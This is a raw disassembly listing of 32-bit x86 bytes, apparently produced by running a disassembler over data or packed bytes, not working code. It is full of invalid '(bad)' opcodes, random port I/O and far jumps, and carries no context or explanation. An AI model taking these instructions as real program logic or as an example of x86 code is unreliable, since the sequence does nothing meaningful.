  4105fe:	div    BYTE PTR [esi+0x5c14e531]
  410604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410605:	or     DWORD PTR [edx-0x2345b41b],ebx
  41060b:	push   ss
  41060c:	out    0x93,eax
  41060e:	clc    
  41060f:	sar    BYTE PTR [esi-0x45],0x95
  410613:	add    eax,0xe815672f
  410618:	stc    
  410619:	mov    esi,0x2b7536c2
  41061e:	daa    
  41061f:	pushf  
  410620:	pop    ss
  410621:	loopne 0x410685
  410623:	jns    0x410677
  410625:	cwde   
  410626:	jo     0x41067e
  410628:	test   esp,0xa606522a
  41062e:	mov    DWORD PTR ds:0x5ec3546c,0x33aa98f
  410638:	jle    0x410680
  41063a:	mov    ebp,0x80f192ee
  41063f:	stos   DWORD PTR es:[edi],eax
  410640:	inc    eax
  410641:	push   ebx
  410642:	jb     0x4106c0
  410644:	mov    esp,0x6c3fb05b
  410649:	xchg   esp,eax
  41064a:	fsub   DWORD PTR [ecx+edi*8]
  41064d:	dec    edi
  41064e:	ficomp WORD PTR [edx+0x55ce4547]
  410654:	lock in eax,0x4a
  410657:	(bad)  
  410658:	imul   edx,edx,0x42
  41065b:	mov    bl,0x13
  41065d:	sub    DWORD PTR [ebx],eax
  41065f:	sbb    DWORD PTR [ebx],eax
  410661:	push   eax
  410662:	test   al,0x9f
  410664:	mov    eax,0xcf2d3487
  410669:	add    ebp,DWORD PTR [ecx-0x23f22ac1]
  41066f:	hlt    
  410670:	sub    DWORD PTR [ebp+0x7b],ebp
  410673:	pop    edi
  410674:	xchg   esp,eax
  410675:	js     0x4105f8
  410677:	push   ebp
  410678:	in     eax,dx
  410679:	ds inc ebx
  41067b:	sub    bh,cl
  41067d:	xor    DWORD PTR [esi+0x2a],edi
  410680:	jb     0x4106de
  410682:	mov    edi,0xe50920d
  410687:	mov    bh,bl
  410689:	adc    DWORD PTR [ebx-0x7a15fe67],edx
  41068f:	aad    0xa
  410691:	fwait
  410692:	and    dl,BYTE PTR [esi+0x3d]
  410695:	xor    bl,BYTE PTR gs:[edi+0x2b44fa8f]
  41069c:	(bad)  
  41069d:	jl     0x4106fd
  41069f:	fwait
  4106a0:	popf   
  4106a1:	repnz adc al,0x3
  4106a4:	ds call 0xc0ad:0x1ea2c29
  4106ac:	dec    ebx
  4106ad:	xchg   ecx,eax
  4106ae:	jmp    0x3a0589c8
  4106b3:	scas   al,BYTE PTR es:[edi]
  4106b4:	(bad)  
  4106b5:	clc    
  4106b6:	aad    0x75
  4106b8:	mov    ebx,0xff8c71c2
  4106bd:	fsubr  QWORD PTR [ebp-0x7a]
  4106c0:	xor    DWORD PTR [edi+0x2],esi
  4106c3:	mov    ?,WORD PTR [ebx]
  4106c5:	(bad)  
  4106c6:	shr    dl,cl
  4106c8:	sub    ch,BYTE PTR [edi]
  4106ca:	ss and eax,0xabaf650d
  4106d0:	test   al,0x5c
  4106d2:	stos   DWORD PTR es:[edi],eax
  4106d3:	iret   
  4106d4:	mov    al,0xd
  4106d6:	push   es
  4106d7:	push   0xe5f89f30
  4106dc:	push   esi
  4106dd:	adc    ecx,DWORD PTR [edx+0x3c]
  4106e0:	gs inc esi
  4106e2:	stc    
  4106e3:	sti    
  4106e4:	mov    ds:0xa02fc1f6,al
  4106e9:	adc    ebp,ebx
  4106eb:	mov    dh,0xeb
  4106ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ee:	inc    eax
  4106ef:	inc    ebp
  4106f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106f1:	push   ebx
  4106f2:	retf   
  4106f3:	mov    ebp,0xedb7de44
  4106f8:	xchg   ecx,eax
  4106f9:	inc    ecx
  4106fa:	add    esi,eax
  4106fc:	push   ecx
  4106fd:	mov    esi,0x7decba1c
  410702:	and    cl,cl
  410704:	sub    BYTE PTR [edi+0x7e63b2f],dh
  41070a:	scas   al,BYTE PTR es:[edi]
  41070b:	fstp   DWORD PTR [ebx+0x8db6f36]
  410711:	addr16 stc 
  410713:	retf   
  410714:	xchg   edx,eax
  410715:	add    cl,dh
  410717:	mov    edx,0xa2b55491
  41071c:	lahf   
  41071d:	add    al,0x3b
  41071f:	cmp    DWORD PTR [edx+edx*4+0x2a],0x38
  410724:	outs   dx,DWORD PTR ds:[si]
  410726:	daa    
  410727:	call   0xb05b1035
  41072c:	xchg   ebp,eax
  41072d:	test   BYTE PTR [esi+0x44],al
  410730:	dec    edi
  410731:	inc    esi
  410732:	cmp    eax,0xe6b538b1
  410737:	adc    DWORD PTR [esi+0x3a],ebp
  41073a:	xor    sp,di
  41073d:	dec    edi
  41073e:	div    DWORD PTR [eax+eax*8]
  410741:	fisub  DWORD PTR [eax]
  410743:	fisttp QWORD PTR [edi]
  410745:	lds    esp,FWORD PTR [ebx+0x3d]
  410748:	xor    DWORD PTR [eax+0x309b82c3],esp
  41074e:	mov    ah,0x27
  410750:	inc    edi
  410751:	inc    esi
  410752:	repz mov esp,0xeaeaff06
  410758:	ffree  st(7)
  41075a:	imul   ebp,DWORD PTR [edi],0xffffffe1
  41075d:	dec    eax
  41075e:	jns    0x41070c
  410760:	jno    0x4106f8
  410762:	pop    eax
  410763:	dec    esi
  410764:	push   0xffffffe0
  410766:	pushf  
  410767:	pop    ss
  410768:	adc    eax,0x6afd2492
  41076d:	lods   al,BYTE PTR ds:[esi]
  41076e:	je     0x4107b3
  410770:	xchg   BYTE PTR [edi+0x4b19c5e1],bh
  410776:	mov    es,esi
  410778:	lea    edi,[ecx-0x7b8bfbc4]
  41077e:	es stc 
  410780:	lods   al,BYTE PTR ds:[esi]
  410781:	mov    BYTE PTR [eax],dl
  410783:	in     eax,dx
  410784:	add    al,0x60
  410786:	mov    eax,0xe0c18dea
  41078b:	mov    bh,0xe4
  41078d:	cmp    DWORD PTR [ebx+esi*1+0x4962de18],ecx
  410794:	dec    esp
  410795:	arpl   WORD PTR [esp+ebp*8-0x744a1a9a],si
  41079c:	dec    ebp
  41079d:	xor    al,0x38
  4107a0:	pusha  
  4107a1:	jo     0x4107a3
  4107a3:	sbb    DWORD PTR [esi+0x5791858d],ebx
  4107a9:	push   eax
  4107aa:	fisubr WORD PTR [edi-0x2b9af7f2]
  4107b0:	retf   0xff80
  4107b3:	sbb    ebx,edx
  4107b5:	imul   edi,DWORD PTR [ecx+0xc],0x3bf7618
  4107bc:	mov    eax,0x8d4dbabd
  4107c1:	xchg   edx,eax
  4107c2:	mov    dl,0xdc
  4107c4:	loop   0x41075c
  4107c6:	scas   eax,DWORD PTR es:[edi]
  4107c7:	ret    0xcb5e
  4107ca:	(bad)  
  4107cb:	xor    al,0x89
  4107cd:	rol    BYTE PTR [edi+0x5],0xf7
  4107d1:	dec    ebp
  4107d2:	dec    eax
  4107d3:	mov    ch,BYTE PTR [esi-0x681ced98]
  4107d9:	push   esi
  4107da:	or     DWORD PTR [esi-0x80],0xc38441ad
  4107e1:	ins    DWORD PTR es:[edi],dx
  4107e2:	jge    0x410801
  4107e4:	xor    edx,DWORD PTR [esp+edx*2]
  4107e7:	test   al,0xc4
  4107e9:	xchg   edx,eax
  4107ea:	cmp    BYTE PTR [ebp+edi*8+0x77],ah
  4107ee:	and    dh,ah
  4107f0:	dec    eax
  4107f1:	fs std 
  4107f3:	xchg   ebp,eax
  4107f4:	adc    BYTE PTR [edi+0x14],bh
  4107f7:	popa   
  4107f8:	add    al,dl
  4107fa:	retf   0xaea5
  4107fd:	xor    esp,esp
  4107ff:	jl     0x41083f
  410801:	fist   DWORD PTR [edx-0x672b788f]
  410807:	dec    ebx
  410808:	xchg   edi,eax
  410809:	in     al,dx
  41080a:	scas   al,BYTE PTR es:[edi]
  41080b:	jecxz  0x41079a
  41080d:	mov    eax,0x265c85f8
  410812:	xchg   esi,eax
  410813:	and    eax,0x30acff0e
  410818:	push   esi
  410819:	or     cl,BYTE PTR [eax]
  41081b:	xchg   ecx,eax
  41081c:	mov    dh,0x63
  41081e:	xor    BYTE PTR [ecx],ch
  410820:	xchg   esi,eax
  410821:	fidiv  DWORD PTR [ebx-0x141182dd]
  410827:	push   es
  410828:	imul   ebx,esp,0xd82f4b78
  41082e:	xchg   esi,eax
  41082f:	mov    ebp,0x43535277
  410834:	jge    0x4108a1
  410836:	mov    ebx,0x8b074ff
  41083b:	ja     0x410801
  41083d:	mov    ecx,ebx
  41083f:	push   ds
  410840:	shr    bh,cl
  410842:	das    
  410843:	dec    ebp
  410844:	pop    ebp
  410845:	in     al,0x76
  410847:	xlat   BYTE PTR ds:[ebx]
  410848:	mov    edx,0xe50fec9b
  41084d:	out    dx,eax
  41084e:	test   edx,0x3cc3ad23
  410854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410855:	mov    eax,ds:0x543397f2
  41085a:	sub    edi,esp
  41085c:	mov    dh,0x42
  41085e:	(bad)  
  41085f:	imul   esi,DWORD PTR [eax-0x3e517d5e],0xffffff95
  410866:	mov    DWORD PTR [ebx+0x39],esi
  410869:	push   esi
  41086a:	or     eax,0xf99d8d4a
  41086f:	addr16 stc 
  410871:	in     eax,0x16
  410873:	and    cl,ch
  410875:	aad    0xd0
  410877:	xchg   DWORD PTR [edx],ebx
  410879:	dec    esp
  41087a:	daa    
  41087b:	arpl   WORD PTR [ecx],ax
  41087d:	scas   eax,DWORD PTR es:[edi]
  41087e:	xchg   esp,eax
  41087f:	mov    cl,0xc4
  410881:	(bad)  
  410882:	add    BYTE PTR [edi-0x75],ch
  410885:	add    DWORD PTR [ebx-0x47833f50],ebp
  41088b:	jl     0x410822
  41088d:	or     esp,esp
  41088f:	js     0x41088d
  410891:	or     al,0x8e
  410893:	jp     0x4108c5
  410895:	mov    esp,0x9fa2380f
  41089a:	adc    cl,cl
  41089c:	stc    
  41089d:	and    esp,esi
  41089f:	test   eax,0x26d7566f
  4108a4:	(bad)  
  4108a5:	fcmovnbe st,st(1)
  4108a7:	add    BYTE PTR [esi+0x63],dh
  4108aa:	mov    WORD PTR [esi-0x43706a17],fs
  4108b0:	cli    
  4108b1:	dec    edi
  4108b2:	inc    esp
  4108b3:	pop    edx
  4108b4:	cwde   
  4108b5:	ins    DWORD PTR es:[edi],dx
  4108b6:	cmp    eax,DWORD PTR [ebp+0x6b14f033]
  4108bc:	pop    esi
  4108bd:	out    0x45,eax
  4108bf:	or     eax,0xeda2d9d4
  4108c4:	sbb    BYTE PTR [esi-0x5c],al
  4108c7:	add    BYTE PTR [edx+0x5a94fa3d],0x68
  4108ce:	jns    0x4108b0
  4108d0:	mov    edi,0xdf5496fb
  4108d5:	inc    esp
  4108d6:	in     eax,dx
  4108d7:	jmp    0x4108cb
  4108d9:	mov    ebx,0x1630b530
  4108de:	xchg   ebp,eax
  4108df:	inc    esp
  4108e0:	stc    
  4108e1:	push   esi
  4108e2:	mov    eax,0x4ad60065
  4108e7:	outs   dx,DWORD PTR ds:[esi]
  4108e8:	shl    DWORD PTR [ebp-0x6a70ee6d],cl
  4108ee:	push   edi
  4108ef:	lea    ebp,[eax-0x33]
  4108f2:	sub    al,0xdd
  4108f4:	ror    BYTE PTR [esi-0x1057279c],1
  4108fa:	cmp    DWORD PTR [ebx+edx*2-0x7e092fd4],0x6b
  410902:	mov    dh,BYTE PTR [edi]
  410904:	xchg   esp,eax
  410905:	out    0xfc,al
  410907:	in     eax,dx
  410908:	imul   esp,DWORD PTR [eax+0xa],0x94db3ee8
  41090f:	fnstsw WORD PTR [ecx+0x321af9cf]
  410915:	cmp    dh,BYTE PTR [eax+0x1080a1c2]
  41091b:	leave  
  41091c:	jae    0x410971
  41091e:	push   es
  41091f:	popf   
  410920:	mov    al,0x2d
  410922:	mov    ah,0x98
  410924:	jnp    0x4108e4
  410926:	xchg   DWORD PTR [edi],ebx
  410928:	xchg   esp,eax
  410929:	int    0x44
  41092b:	gs fst st(0)
  41092e:	xchg   ebp,eax
  41092f:	push   es
  410930:	dec    eax
  410931:	(bad)  
  410932:	outs   dx,DWORD PTR ds:[esi]
  410933:	and    eax,0x86eedd1e
  410938:	ins    BYTE PTR es:[edi],dx
  410939:	test   BYTE PTR [eax+0x18b40ffa],dh
  41093f:	jb     0x41090d
  410941:	add    eax,0xabb7e14b
  410946:	sub    bh,dh
  410948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410949:	into   
  41094a:	(bad)  
  41094b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41094c:	addr16 jmp 0x410955
  41094f:	add    BYTE PTR [esi],0xf2
  410952:	loope  0x4109c0
  410954:	mov    esi,0x37026eef
  410959:	mov    ch,0xb0
  41095b:	btc    DWORD PTR [edx],ecx
  41095e:	jo     0x4109bf
  410960:	cmp    BYTE PTR ds:0x6c2876f3,bh
  410966:	fsubr  QWORD PTR [eax+0x14a3bcb5]
  41096c:	cmp    DWORD PTR [eax-0x7b],esi
  41096f:	sub    al,0x20
  410971:	inc    ebp
  410972:	pop    edx
  410973:	and    eax,0xc9fc3224
  410978:	xor    ebx,ebp
  41097a:	and    edi,ebx
  41097c:	mov    cl,0x9a
  41097e:	push   cs
  41097f:	push   ecx
  410980:	jo     0x410911
  410982:	push   edi
  410983:	push   edi
  410984:	inc    edx
  410985:	lahf   
  410986:	mov    esi,0x7fa10ba8
  41098b:	cmp    eax,0xeb439f73
  410990:	loope  0x4109c9
  410992:	repz push ebp
  410994:	fisttp DWORD PTR [esi]
  410996:	shl    DWORD PTR [edx],1
  410998:	jmp    0x5f40ad47
  41099d:	dec    ecx
  41099e:	mov    bl,0x9e
  4109a0:	(bad)  
  4109a1:	scas   eax,DWORD PTR es:[edi]
  4109a2:	hlt    
  4109a3:	cdq    
  4109a4:	push   0xb
  4109a6:	xchg   dh,dh
  4109a8:	and    ecx,DWORD PTR [esi-0x1a]
  4109ab:	cmc    
  4109ac:	setg   BYTE PTR [edx-0x6219368e]
  4109b3:	sub    eax,0x2c215e41
  4109b8:	xchg   esi,eax
  4109b9:	jb     0x4109a8
  4109bb:	mov    dl,0x67
  4109bd:	cmp    DWORD PTR [esi-0x4e],edx
  4109c0:	inc    ebp
  4109c1:	(bad)  
  4109c2:	aaa    
  4109c3:	dec    ebp
  4109c4:	in     eax,0x4c
  4109c6:	mov    esp,0x23710873
  4109cb:	xchg   BYTE PTR ds:0x9f7476dc,cl
  4109d1:	dec    edi
  4109d2:	cmp    bl,BYTE PTR [ecx]
  4109d4:	imul   ebx,DWORD PTR [esi-0x7b91a73f],0x54
  4109db:	pusha  
  4109dc:	jl     0x41097c
  4109de:	xchg   edi,eax
  4109df:	mov    bh,0x6a
  4109e1:	jnp    0x4109fd
  4109e3:	mov    edx,0xec9058d4
  4109e8:	add    BYTE PTR [esp+esi*8-0x15],bl
  4109ec:	pop    eax
  4109ed:	shr    BYTE PTR [ebx],cl
  4109ef:	add    eax,0xe33e9cc6
  4109f4:	or     BYTE PTR [edx],dh
  4109f6:	push   DWORD PTR [eax+edx*2-0x40b9bf32]
  4109fd:	call   0x489c:0x5b4b6fd1
  410a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a05:	mov    ecx,0x62ab69fb
  410a0a:	clc    
  410a0b:	xor    ah,BYTE PTR [esi-0x527a3ec0]
  410a11:	addr16 addr16 xchg ecx,eax
  410a14:	xor    DWORD PTR [ebx+0x495558ee],0x67
  410a1b:	addr16 push es
  410a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a1e:	adc    al,0xb8
  410a20:	and    DWORD PTR [edx+0x25f59f6d],esi
  410a26:	repz stc 
  410a28:	cmp    eax,0x7c76a5d4
  410a2d:	mov    WORD PTR [edx+0x739ecaf1],cs
  410a33:	call   0x1d7c8a5b
  410a38:	sub    cl,BYTE PTR [ebp-0x2e]
  410a3b:	out    0xef,eax
  410a3d:	and    bl,cl
  410a3f:	ss jg  0x4109d6
  410a42:	lahf   
  410a43:	(bad)  
  410a45:	sbb    DWORD PTR [edi],0xffffffac
  410a48:	fistp  WORD PTR [eax-0xa]
  410a4b:	(bad)  
  410a4c:	retf   
  410a4d:	jae    0x410a59
  410a4f:	jo     0x410a87
  410a51:	jg     0x410aaa
  410a53:	inc    esi
  410a55:	sbb    BYTE PTR [edx],cl
  410a57:	mov    dl,0x0
  410a59:	adc    eax,0x78aa9af0
  410a5e:	ret    0xc133
  410a61:	inc    esp
  410a62:	push   0x6d
  410a64:	jg     0x410ad6
  410a66:	dec    esi
  410a67:	push   esi
  410a68:	je     0x410a66
  410a6a:	test   BYTE PTR [ecx+0x42813f92],bh
  410a70:	jge    0x410a86
  410a72:	add    dh,cl
  410a74:	inc    esp
  410a75:	sub    dh,cl
  410a77:	adc    BYTE PTR [ecx+0xcf09814],ch
  410a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a7e:	test   BYTE PTR [esi+0x62],al
  410a81:	data16 mov cs:0x25db9004,al
  410a88:	adc    DWORD PTR [esp+edx*4+0x10],edx
  410a8c:	adc    ecx,DWORD PTR [ebp-0x16]
  410a8f:	and    eax,DWORD PTR [esi-0x2fb9e73e]
  410a95:	scas   al,BYTE PTR es:[edi]
  410a96:	add    eax,0x8bc1a2bf
  410a9b:	mov    al,0xc1
  410a9d:	lods   eax,DWORD PTR ds:[esi]
  410a9e:	pop    edi
  410a9f:	(bad)  
  410aa1:	into   
  410aa2:	pop    edi
  410aa3:	adc    eax,0x52f007f7
  410aa8:	jecxz  0x410a73
  410aaa:	call   0xfe2e0003
  410aaf:	mov    edx,edx
  410ab1:	ficomp WORD PTR [ebx-0x243658fe]
  410ab7:	int3   
  410ab8:	nop
  410ab9:	test   eax,0xa130a003
  410abe:	out    dx,al
  410abf:	dec    ecx
  410ac0:	ss fs imul esp,ebp,0x48
  410ac5:	repz sar BYTE PTR [edx],1
  410ac8:	push   eax
  410aca:	cdq    
  410acb:	js     0x410ab5
  410acd:	pusha  
  410ace:	out    dx,al
  410acf:	in     al,0x68
  410ad1:	mov    esp,0x80477f7f
  410ad6:	sti    
  410ad7:	retf   
  410ad8:	jbe    0x410ae5
  410ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410adb:	and    eax,0x6d5997b6
  410ae0:	stc    
  410ae1:	dec    edi
  410ae2:	mov    edx,0x49780fac
  410ae7:	addr16 push ecx
  410ae9:	sbb    al,0x5d
  410aeb:	shr    bl,1
  410aed:	add    eax,0xe2790a05
  410af2:	inc    edi
  410af3:	push   esi
  410af4:	xchg   esp,eax
  410af5:	fsub   DWORD PTR [eax+0x68]
  410af8:	or     dh,BYTE PTR [edi]
  410afa:	cmp    ebp,edi
  410afc:	pop    ecx
  410afd:	and    BYTE PTR [edi-0x5bf450a2],0xf
  410b04:	mov    ds:0x625a678e,eax
  410b09:	stos   DWORD PTR es:[edi],eax
  410b0a:	inc    esi
  410b0b:	inc    eax
  410b0c:	add    BYTE PTR [ebp+0x67],0xa8
  410b10:	xchg   ebx,eax
  410b11:	cdq    
  410b12:	xchg   ebx,eax
  410b13:	clc    
  410b14:	inc    ecx
  410b15:	in     eax,dx
  410b16:	sub    eax,0x91d390d8
  410b1b:	mov    ebp,0xec128012
  410b20:	lods   al,BYTE PTR ds:[esi]
  410b21:	repz cs pop edi
  410b24:	mov    ss,WORD PTR [esi-0x77]
  410b27:	mov    DWORD PTR [edx+edi*2],edi
  410b2a:	(bad)  
  410b2b:	das    
  410b2c:	inc    esi
  410b2d:	fs sbb al,0x48
  410b30:	and    BYTE PTR [ecx+0x30a92b15],al
  410b36:	mov    dl,0xf7
  410b38:	push   edi
  410b39:	scas   al,BYTE PTR es:[edi]
  410b3a:	aaa    
  410b3b:	adc    DWORD PTR [eax-0x3020f225],esp
  410b41:	adc    eax,0x1bface62
  410b46:	mov    eax,ds:0x9ecf67c
  410b4b:	clc    
  410b4c:	das    
  410b4d:	sub    DWORD PTR [ebx-0x12],ecx
  410b50:	xchg   ebx,eax
  410b51:	pop    ss
  410b52:	jb     0x410b8f
  410b54:	pop    ebx
  410b55:	gs (bad) 
  410b57:	jmp    0xd5548605
  410b5c:	jle    0x410b37
  410b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b5f:	into   
  410b60:	pop    ecx
  410b61:	ror    BYTE PTR [ecx+0x628522fa],1
  410b67:	xchg   ebx,eax
  410b68:	sbb    edx,edx
  410b6a:	int    0xa7
  410b6c:	and    al,0x90
  410b6e:	int3   
  410b6f:	fisub  DWORD PTR [esi-0x5a84610b]
  410b75:	or     eax,DWORD PTR [eax+esi*2-0x479fb3b5]
  410b7c:	and    edi,esi
  410b7e:	mov    edx,0x4ff85085
  410b83:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410b85:	je     0x410bcf
  410b87:	or     al,0x3a
  410b89:	outs   dx,DWORD PTR ds:[esi]
  410b8a:	inc    ebx
  410b8b:	sbb    BYTE PTR [ecx+0x32115bda],ch
  410b91:	call   0x1e6a:0xbe1b0d56
  410b98:	dec    esi
  410b99:	gs aam 0x0
  410b9c:	sbb    ecx,esp
  410b9e:	loopne 0x410bf4
  410ba0:	bound  edx,QWORD PTR [ebx-0x2c9c92df]
  410ba6:	daa    
  410ba7:	(bad)  
  410ba8:	int3   
  410ba9:	in     al,0x24
  410bab:	push   ss
  410bac:	mov    eax,0x1f84a93f
  410bb1:	idiv   DWORD PTR [ecx+0x20]
  410bb4:	(bad)  
  410bb5:	mov    ds:0x86471044,al
  410bba:	(bad)  
  410bbc:	scas   al,BYTE PTR es:[edi]
  410bbd:	push   ss
  410bbe:	adc    bl,bl
  410bc0:	leave  
  410bc1:	and    DWORD PTR [ebx-0x70a2d415],esp
  410bc7:	mov    eax,ds:0x1fb166c1
  410bcc:	dec    esi
  410bcd:	xchg   ecx,eax
  410bce:	push   edx
  410bcf:	adc    DWORD PTR [ecx],eax
  410bd1:	jge    0x410bdc
  410bd3:	sub    dx,dx
  410bd6:	sub    al,0xf7
  410bd8:	cmc    
  410bd9:	xchg   edx,eax
  410bda:	adc    DWORD PTR [ebx-0x1],edx
  410bdd:	out    0xa8,eax
  410bdf:	adc    BYTE PTR [esi+ecx*2-0x29],0xfa
  410be4:	int3   
  410be5:	stos   DWORD PTR es:[edi],eax
  410be6:	cmp    DWORD PTR [edx*4-0x73ca1a9a],edi
  410bed:	mov    dh,0x89
  410bef:	dec    ecx
  410bf0:	add    eax,0x39623db0
  410bf5:	adc    al,0xc2
  410bf7:	xor    BYTE PTR [esi+edx*8-0xf41409f],ah
  410bfe:	xchg   edi,eax
  410bff:	out    dx,al
  410c00:	test   DWORD PTR [edi+eiz*2],ebx
  410c03:	cli    
  410c04:	pop    ebp
  410c05:	xor    eax,DWORD PTR [ecx+ebx*4+0x1c]
  410c09:	mov    ds:0x4c413326,eax
  410c0e:	test   eax,0x77493d77
  410c13:	in     eax,dx
  410c14:	enter  0x3811,0xd1
  410c18:	push   ss
  410c19:	jmp    0x410c43
  410c1b:	jo     0x410bf0
  410c1d:	jno    0x410c33
  410c1f:	std    
  410c20:	cwde   
  410c21:	jg     0x410baf
  410c23:	leave  
  410c24:	push   eax
  410c25:	neg    BYTE PTR [eax-0x10db94bf]
  410c2b:	and    edx,DWORD PTR [ebp+0x75]
  410c2e:	std    
  410c2f:	stc    
  410c30:	cmp    ecx,ebx
  410c32:	dec    esi
  410c33:	test   DWORD PTR [edi],ebx
  410c35:	ror    DWORD PTR [ebp-0x3f],0x76
  410c39:	cdq    
  410c3a:	hlt    
  410c3b:	push   eax
  410c3c:	(bad)  
  410c3d:	loopne 0x410c95
  410c3f:	int3   
  410c40:	push   ds
  410c41:	mov    BYTE PTR [eax],bl
  410c43:	int    0xda
  410c45:	(bad)  
  410c46:	int3   
  410c47:	test   al,0x48
  410c49:	cmp    DWORD PTR [esi+eiz*1-0x2a],edx
  410c4d:	adc    eax,0xb59af750
  410c52:	dec    edi
  410c53:	jecxz  0x410c87
  410c55:	aaa    
  410c56:	xchg   edi,eax
  410c57:	mov    ch,0x1a
  410c59:	scas   eax,DWORD PTR es:[edi]
  410c5a:	xor    ch,BYTE PTR [eax]
  410c5c:	fcmovne st,st(7)
  410c5e:	xchg   ebx,eax
  410c5f:	fidiv  WORD PTR [eax+0x2bfaeae5]
  410c65:	xor    BYTE PTR [ecx+0x7fae5fbf],ch
  410c6b:	ret    
  410c6c:	por    mm5,QWORD PTR [eax]
  410c6f:	pusha  
  410c70:	cmp    cl,BYTE PTR [esi+ebp*1]
  410c73:	imul   esi,esp,0xa6f5ef3f
  410c79:	jmp    0x83c00521
  410c7e:	imul   edx,edi,0xf596e34a
  410c84:	sub    DWORD PTR [eax],0x54
  410c87:	das    
  410c88:	mov    eax,ds:0x737e0720
  410c8d:	popf   
  410c8e:	fimul  DWORD PTR [ebx+0x2b72846d]
  410c94:	or     cl,BYTE PTR [ebx]
  410c96:	xchg   edx,eax
  410c97:	lods   al,BYTE PTR ds:[esi]
	...
  410d14:	mov    ecx,0xbfb9b684
  410d19:	mov    ebx,0xac284bf
  410d1e:	mov    ebp,DWORD PTR [edx-0x51]
  410d21:	js     0x410d55
  410d23:	hlt    
  410d24:	shl    DWORD PTR [edi+0x76c0000],1
  410d2a:	add    BYTE PTR [eax],al
  410d2c:	shl    BYTE PTR [eax-0x68],0x7e
  410d30:	dec    esp
  410d31:	cmp    DWORD PTR [eax+0x2c],0x48744539
  410d38:	and    al,0xd5
  410d3a:	xor    eax,edx
  410d3c:	add    BYTE PTR [edx-0x63],ch
  410d3f:	enter  0x3c38,0x31
  410d43:	sub    DWORD PTR [esi-0x35],eax
  410d46:	mov    ch,0xdd
  410d48:	push   ss
  410d49:	call   FWORD PTR [eax+0x57aea4af]
  410d4f:	xor    eax,0xb066d252
  410d54:	retf   0xa8d7
  410d57:	fmul   QWORD PTR [ebx]
  410d59:	adc    al,0x4
  410d5b:	mov    ds:0xf7ed25dc,eax
  410d60:	pop    ecx
  410d61:	or     ch,BYTE PTR [esi-0x6c0f896d]
  410d67:	xor    ch,BYTE PTR [eax]
  410d69:	lods   al,BYTE PTR ds:[esi]
  410d6a:	inc    esp
  410d6b:	pop    ss
  410d6c:	rcl    BYTE PTR fs:[bp+0x1],cl
  410d71:	cmc    
  410d72:	or     DWORD PTR [ebp-0x7b],edi
  410d75:	mov    ebp,0xf95a4ed9
  410d7a:	retf   0xbe22
  410d7d:	inc    ecx
  410d7e:	xchg   ebp,eax
  410d7f:	add    al,0xfe
  410d81:	jmp    0x27ab:0xac94a785
  410d88:	(bad)  
  410d89:	cld    
  410d8a:	xlat   BYTE PTR ds:[ebx]
  410d8b:	out    dx,al
  410d8c:	fbld   TBYTE PTR [ebp-0x50]
  410d8f:	cs ins DWORD PTR es:[edi],dx
  410d91:	dec    edi
  410d92:	ret    0xb052
  410d95:	mov    ah,0xbd
  410d97:	mov    ah,0x6b
  410d99:	scas   eax,DWORD PTR es:[edi]
  410d9a:	mov    al,ds:0x914a4f61
  410d9f:	inc    ebp
  410da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da1:	lock sub esp,DWORD PTR [edx-0x2ac6106b]
  410da8:	rcr    dl,1
  410daa:	aaa    
  410dab:	cmp    eax,esp
  410dad:	retf   
  410dae:	jp     0x410dfa
  410db0:	icebp  
  410db1:	ficomp DWORD PTR [ebx]
  410db3:	sbb    DWORD PTR ds:0x77c7540e,edi
  410db9:	inc    ebp
  410dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dbb:	retf   
  410dbc:	and    esi,DWORD PTR [ecx-0x68]
  410dbf:	dec    ebp
  410dc0:	jae    0x410d49
  410dc2:	sar    ebx,1
  410dc4:	dec    eax
  410dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dc6:	lods   eax,DWORD PTR ds:[esi]
  410dc7:	and    al,0x7c
  410dc9:	push   esi
  410dca:	mov    DWORD PTR [ebx+0x7ae3cbfc],esp
  410dd0:	pop    edi
  410dd1:	mov    WORD PTR [eax+0x12f8179d],ss
  410dd7:	cli    
  410dd8:	jne    0x410e2a
  410dda:	add    al,0x7f
  410ddc:	and    BYTE PTR [eax-0x3c],dh
  410ddf:	pop    ebx
  410de0:	add    eax,0x47abc142
  410de5:	sbb    edi,DWORD PTR [edx]
  410de7:	and    edx,DWORD PTR [edi+0x38]
  410dea:	cli    
  410deb:	shl    BYTE PTR [esi+edi*1],1
  410dee:	sbb    eax,0x2058e5b1
  410df3:	cs int 0x2d
  410df6:	cs dec edx
  410df8:	mov    al,0x1e
  410dfa:	fmul   QWORD PTR [eax]
  410dfc:	stos   BYTE PTR es:[edi],al
  410dfd:	into   
  410dfe:	adc    ebx,DWORD PTR [ecx+0x7ce22ff]
  410e04:	jnp    0x410dda
  410e06:	sub    ecx,edi
  410e08:	retf   0xecf0
  410e0b:	inc    ebx
  410e0c:	pop    ss
  410e0d:	lock test al,0x60
  410e10:	scas   al,BYTE PTR es:[edi]
  410e11:	mov    esi,0xbcf944d8
  410e16:	fist   WORD PTR [ebx-0x2182f2d3]
  410e1c:	mov    edi,0x3c98b61c
  410e21:	imul   ecx,esp,0xdd18a43e
  410e27:	daa    
  410e28:	push   es
  410e29:	pop    esp
  410e2a:	daa    
  410e2b:	add    al,0x50
  410e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e2e:	mov    esp,0x192891a2
  410e33:	push   ss
  410e34:	add    al,0xd0
  410e36:	fwait
  410e37:	jbe    0x410e19
  410e39:	mul    BYTE PTR [ebx]
  410e3b:	cwde   
  410e3c:	in     eax,0x60
  410e3e:	(bad)  
  410e3f:	call   ebx
  410e41:	inc    eax
  410e42:	cld    
  410e43:	and    edx,DWORD PTR [ecx]
  410e45:	loop   0x410ea0
